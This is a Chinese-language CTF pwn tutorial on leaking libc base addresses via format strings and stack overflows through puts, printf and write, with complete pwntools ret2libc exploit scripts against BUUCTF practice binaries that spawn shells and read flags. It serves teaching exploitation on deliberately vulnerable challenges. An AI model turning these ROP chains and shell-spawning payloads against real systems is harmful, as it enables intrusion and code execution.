## 拿libc基地址

### 方法一：格式化字符串

1. 格式化字符串，首先确定输入的 **AAAA** 在栈上的位置（x）。
2. 使用 **elf.got[fun]** 获得got地址。
3. 利用格式化字符串，构造payload泄漏got地址处的值，recv接受到的字符串中，[4:8]即为fun函数的地址fun_addr。
   * payload  = p32(got) + b'%x$s'
   * fun_address = u32(p.recvuntil(b'\xf7')[4:8])
4. 利用 **LibcSearcher** 选择libc的版本。
5. 最后计算libc的基地址： **libcbase = fun_addr - libc.dump("fun")**
6. 最后根据基地址libcbase即可计算system函数的绝对地址：
   * sys_addr = libcbase + libc.dump("system")
   * sh_addr  = libcbase + libc.dump("str_bin_sh")
7. 最后根据获得到的地址即可构造ROP链。

##### 实例：

``````python
from pwn import *
from LibcSearcher import *
p=process("./test3")
elf=p.elf

fun_name="read"

#get the fun'got_address
fun_got=elf.got[fun_name]  #0x804c004
fun_plt=elf.plt[fun_name]  #0x8049040
print(hex(fun_got),hex(fun_plt))

p.recvuntil(b"hello\n")

#yichu
payload = p32(0x804c004) + b'%10$s'
p.sendline(payload)


fun_address = u32(p.recvuntil(b'\xf7')[4:8])
print("fun_address:",hex(fun_address))

#base_address
libc = LibcSearcher(fun_name,fun_address)
libc_base = fun_address - libc.dump(fun_name)
print("libc_base :",hex(libc_base))

#get system address and shell address
sys_address = libc_base + libc.dump('system')
sh_address  = libc_base + libc.dump('str_bin_sh')
print("system address:",hex(sys_address))
print("bin_sh address:",hex(sh_address))
``````





### 方法二：栈溢出

#### 1. puts函数

![image-20240529174702310](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406012219604.png)

1. 利用 **puts函数** ，泄漏一个函数的got地址，然后输出got地址处的数据，即为该函数的真实地址。
2. 首先确定栈溢出的位置：ida中查看栈的位置，确定好溢出的偏移。

![image-20240529175118360](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406012219800.png)

3. 使用 **ELF.got[fun_name]，ELF.plt['puts']** ,泄漏 fun_name的got地址和 **puts函数的plt地址**。

4. 利用栈溢出、got地址、puts函数的plt地址来输出got地址处的值，即fun_name函数的地址：

   * 64位下puts参数传递：利用 **rdi寄存器** 传递参数，使用指令 **ROPgadget --binary xxx --only ‘pop|ret’ ** 拿到ret_addr用来给rdi传参。
   * 构造 **payload = b'a'*(offset)+p64(ret_addr)+p64(got)+p64(puts_plt)+p64(ret)**
   * 其中 **got** 是给调用puts函数是传递的参数，puts_plt是用来调用puts函数，最后ret是执行完puts函数后返回的地址可斟酌选择。（一般用 **puts函数** 输出 **puts函数的地址** ）
   * sendline完成，recv接受fun_name函数的地址： **addr=u64(p.recv(6).ljust(0x8,b'\x00'))**，其中recv(6)表示只接受6字节的数据， **ljust** 将接受到的数据 **左对齐** ，并且 **长度位8个字节** （保证u64转化位无符号整数时满64bit即8字节，否则会报错），不足的用00补充。
   * 然后同样使用 **libc = LibcSearcher('puts',addr)，libcbase = addr - libc.dump('puts')** 选择libc版本计算libc的基地址libcbase。
   * 最后计算 **system函数** 和 **str_bin_sh** 的地址：
     * sys_addr = libcbase + libc.dump('system')，sh_addr = libcbase + libc.dump('str_bin_sh')

   ![image-20240529180635845](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405291806891.png)

   ##### 实例：

   1. 题目：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_c_1)

   2. EXP：

      ``````python
      from pwn import *
      from LibcSearcher import *
      
      context(os='linux', arch='amd64', log_level='debug')
      
      p=remote("node5.buuoj.cn",29996)
      
      elf = ELF('./ciscn_2019_c_1')
      ret_address = 0x400c83
      
      got = elf.got['puts']		#0x602020
      plt = elf.plt['puts']
      #print(hex(got))
      main_address = 0x400B28
      p.recv()
      p.sendline(b'1')
      p.recvuntil(b"encrypted\n")
      
      payload = (b'a'*(0x50+8))+p64(ret_address)+p64(got)+p64(plt)+p64(main_address)
      p.sendline(payload)
      p.recvuntil(b'Ciphertext\n')
      p.recvuntil(b'\n')
      addr=u64(p.recv(6).ljust(0x8,b'\x00'))
      print(hex(addr))
      libc = LibcSearcher('puts',addr)
      libcbase = addr - libc.dump('puts')
      print(hex(libcbase))
      sys_addr = libcbase + libc.dump('system')
      sh_addr = libcbase + libc.dump('str_bin_sh')
      
      p.recv()
      p.sendline(b'1')
      p.recvuntil(b"encrypted\n")
      payload = b'a'*0x58+p64(ret_address)+p64(sh_addr)+p64(0x4006B9)+p64(sys_addr)
      p.sendline(payload)
      p.interactive()
      
      ``````

#### 2. printf函数(64位)：

1. 题目中之哦于printf函数输出，并由栈溢出漏洞。

##### 实例：

1. 题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#pwn2_sctf_2016)

2. main函数中只有一个栈溢出漏洞，并且程序只有一个pirntf函数回显，考虑使用printf函数来泄漏libc地址。

3. printf函数输出地址：需要传递两个参数， 格式化字符串 **%s的地址** ，待泄漏数据的地址 **got表地址**，由于是64为的程序，所以 **第一个参数** 传递给 **rdi寄存器** ， **第二个参数** 传递给 **rsi寄存器** ，使用ROPgadget在程序中查找相应指令的地址即可。

4. EXP，不知道为什么64位的程序，泄漏printf函数got表上的值时不能成功泄漏：

   ```python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node5.buuoj.cn",27096)
   elf=ELF('./babyrop2')
   libc = ELF('./libc.so.6')
   
   fun_name = 'printf'
   got = elf.got['read']
   plt = elf.plt[fun_name]
   print(hex(got),hex(plt))
   
   main_addr = 0x400636
   pop_rdi_ret = 0x400733
   pop_rsi_r15_ret = 0x400731 
   ret_addr = 0x400734
   offset = 0x20+8
   s_addr = 0x400790
   
   p.recvuntil(b"What's your name? ")
   payload = b'a'*(offset)+p64(ret_addr)+p64(pop_rdi_ret)+p64(s_addr)+p64(pop_rsi_r15_ret)+p64(got)+p64(0x0)+p64(plt)+p64(main_addr)
   
   p.sendline(payload)
   
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   p.recv()
   
   #libc = LibcSearcher('read',addr)
   libcbase = addr - libc.sym['read']
   print("libcbase:",hex(libcbase))
   sys_addr = libcbase + libc.sym['system']
   str_sh   = libcbase + next(libc.search(b'/bin/sh'))
   print(hex(sys_addr),hex(str_sh))
   
   payload = b'a'*(offset)+p64(pop_rdi_ret)+p64(str_sh)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cd home')
   p.sendline(b'cd babyrop2')
   p.sendline(b'cat flag')
   p.interactive()
   ```

   ![image-20240602202650369](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406022026480.png)

#### 3. printf函数32位：

##### 实例：

1. 题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#pwn2_sctf_2016)

2. vuln函数给了一个整数溢出（绕过）+栈溢出漏洞，用负数绕过后栈溢出直接利用printf函数泄漏libc基地址，再获取sys和bin构造ROP链。

3. EXP：

   ```python
   #!/usr/bin/env python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   p = remote('node5.buuoj.cn',28217)
   elf = ELF('./pwn2_sctf_2016')
   libc = ELF('./libc-2.23.so')
   got = elf.got['printf']
   plt = elf.plt['printf']
   print(hex(got),hex(plt))
   
   p.recvuntil(b'How many bytes do you want me to read?')
   p.sendline(b'-1')
   p.recvuntil(b'''data!\n''')
   
   main_addr = 0x080485B8
   s_addr = 0x08048702
   
   payload = b'a'*(0x2c+4)+p32(plt)+p32(main_addr)+p32(s_addr)+p32(got)
   p.sendline(payload)
   p.recvuntil(b'You said:')
   addr = u32(p.recvuntil(b'\xf7')[-4:])
   print(hex(addr))
   
   #libc = LibcSearcher('printf',addr) #远程的LibcSearcher一个都打不通，无语了
   libc_base = addr - libc.sym['printf']
   sys_addr = libc_base + libc.sym['system']
   sh_addr = libc_base + next(libc.search(b'/bin/sh'))
   print(hex(libc_base),hex(sys_addr),hex(sh_addr))
   
   p.sendline(b'-1')
   p.recvuntil(b'''data!\n''')
   
   payload = b'a'*(0x2c+4)+p32(sys_addr)+p32(main_addr)+p32(sh_addr)
   p.sendline(payload)
   
   p.sendline(b'cat flag')
   p.interactive()
   
   ```

   ![image-20240602213259352](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406022132526.png)





#### 4. write函数溢出（题目里面给出libc的版本32位）

1. 利用write函数的got表和plt表，溢出得到write函数的地址，在计算得到libc_base基地址。

2. 先看汇编下调用write函数时参数的传递：（以32位为例）**长度+地址+1** 构造栈时反过来 **1+地址+长度** 

   ![image-20240530091712374](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406012219144.png)

3. 溢出EXP：

   ``````python
   #启动题目所给的so文件，so文件需要在同一目录下
   libc=ELF('libc-2.23.so')
   got = elf.got['write']
   plt = elf.plt['write']
   main_addr = 0x08048825
   
   #构造payload，利用write函数输出write函数的实际地址
   payload = b'a'*(0xe7+4)+p32(plt)+p32(main_addr)+p32(1)+p32(got)+p32(4)
   p.sendline(payload)
   #接受返回的地址
   addr = u32(p.recv(4).ljust(4,b'\x00'))
   print(hex(addr))
   ``````

4. 利用返回的地址计算liba_base，sys_addr，bin_addr地址：

   ``````python
   #计算基地址libabase
   libcbase = addr - libc.sym['write']
   #拿到sys_addr和bin_addr
   sys_addr = libcbase + libc.sym['system']
   str_sh   = libcbase + next(libc.search('/bin/sh'))
   print(hex(sys_addr),hex(str_sh))
   
   #最后利用计算的函数地址和'bin/sh'地址，栈溢出构造ROP
   payload = b'a'*(0xe7+4)+p32(sys_addr)+p32(0)+p32(str_sh)
   p.sendline(payload)
   p.interactive()
   ``````


#### 5. write函数溢出（题目没给给出libc的版本32位）

1. 题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#铁人三项(第五赛区)_2018_rop)

2. 题目没有提供后门函数，但是给了栈溢出和write函数调用：

   ![image-20240601105706072](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406011057120.png)

   ![image-20240601104919755](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406011049807.png)

3. 这里可以利用vulnerable_function函数进行栈溢出，利用write函数泄漏write函数的地址，从而拿到libc，使用write函数泄漏write函数地址时（puts函数同理），即使程序在前面 **没有调用过write函数** ，也可以 **直接利用栈溢出** 泄漏，因为在栈溢出时，程序会先解析write函数的地址将其填入got表项中：

   ``````python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='i386', log_level='debug')
   
   p=remote("node5.buuoj.cn",28334)
   elf=ELF('./2018_rop')
   got = elf.got['write']
   plt = elf.plt['write']
   print(hex(got),hex(plt))
   main_addr = 0x080484C6
   
   #这里程序会跳转到write函数的plt表，由于先前没有调用过write函数，所以此时write函数的got表还未填充地址，要调用write函数，程序会先解析write函数的地址（此时wrie函数的got表会更新），也就能泄漏write函数的地址了。
   payload = b'a'*(0x88+4)+p32(plt)+p32(main_addr)+p32(1)+p32(got)+p32(4)
   p.sendline(payload)
   addr = u32(p.recv())
   print(hex((addr)))
   
   libc = LibcSearcher('write',addr)
   liba_base = addr - libc.dump('write')
   sys_addr = liba_base + libc.dump('system')
   sh_addr  = liba_base + libc.dump('str_bin_sh')
   print(hex(liba_base),hex(sys_addr),hex(sh_addr))
   
   
   payload = b'a'*(0x88+4)+p32(sys_addr)+p32(0)+p32(sh_addr)
   p.sendline(payload)
   
   p.sendline(b'cat flag')
   p.interactive()
   
   ``````

   ![image-20240601110334585](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406011103660.png)

4. write函数(64位)

   1. 明显可见，是ret2libc，先使用write函数得到libc基地址，在栈溢出。

   ![image-20240629104326165](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406291043250.png)

   2. 但是程序是64位，所以需要给rdi，rsi，rdx传参。rdi和rsi可以直接使用ROPgadget查得到，但是rdx只能使用ret2csu得到，但是不用给rdx传参，在read函数输入完成后rdx的参数任然为0x200，对于write来说完全足够，下面使用gdb调试来看看。

      ![image-20240629110253222](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406291102362.png)

      可以看到出read函数后，rdx的值仍为0x200，所以可以不用在给rdx赋值。

5. EXP：

   ``````python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   io = remote("node5.buuoj.cn", 27094)
   elf = ELF("./level3_x64")
   got = elf.got['write']
   plt = elf.sym['write']
   print(hex(got),hex(plt))
   pop_si_r15_ret = 0x00000000004006b1
   pop_di_ret = 0x00000000004006b3
   ret_addr = 0x0000000000400499
   main_addr = 0x00000000004005E6
   
   io.recvuntil(b'Input:\n')
   #可以不用个rdx赋值，仅为rdi和rsi赋值即可
   payload = b"a"*(0x80+8) + p64(pop_di_ret)+p64(0x1)+p64(pop_si_r15_ret)+p64(got)+p64(0)+p64(plt)+p64(main_addr)
   io.sendline(payload) 
   addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   io.recvuntil(b'Input:\n')
   
   libc = LibcSearcher('write',addr)
   libc_base = addr - libc.dump('write')
   sys_addr = libc_base + libc.dump('system')
   str_bin = libc_base + libc.dump('str_bin_sh')
   print(hex(libc_base),hex(sys_addr),hex(str_bin))
   
   #第二次利用栈溢出
   payload = b'a'*(0x80+8)+p64(ret_addr)+p64(pop_di_ret)+p64(str_bin)+p64(sys_addr)
   io.sendline(payload)
   #io.sendline(b'cat flag')
   # 与远程交互
   io.interactive()
   
   ``````

   